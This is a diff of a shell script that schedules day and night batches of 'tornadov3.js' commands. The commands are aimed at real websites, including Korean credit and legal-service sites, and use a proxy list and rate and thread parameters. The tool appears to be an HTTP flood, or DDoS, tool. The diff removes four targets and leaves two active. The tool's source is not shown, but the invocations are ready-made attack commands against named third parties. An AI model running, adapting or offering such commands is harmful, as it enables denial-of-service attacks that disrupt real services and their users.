@@ -42,15 +42,11 @@ clean_large_logs() {
 # ------------------- 任务批次 -------------------
 day_commands=(
     "node tornadov3.js GET 'https://kode24.co.kr/' 120 100 64 proxy.txt --query 1 --debug"
-    "node tornadov3.js GET 'https://newdobak.com/?ckattempt=1' 120 100 64 proxy.txt --query 1 --debug"
-    "node tornadov3.js GET 'https://www.credit.co.kr/ib20/mnu/BZWMAN00001' 120 100 64 proxy.txt --query 1 --debug"
 )
 
 
 night_commands=(
     "node tornadov3.js GET 'https://int-legal-assist.com/' 120 100 64 proxy.txt --query 1 --debug"
-    "node tornadov3.js GET 'https://www.barristrin-law.com/' 120 100 64 proxy.txt --query 1 --debug"
-    "node tornadov3.js GET 'https://titanxo.com/sb' 120 100 64 proxy.txt --query 1 --debug"
 )
 
 # ------------------- 主循环 -------------------
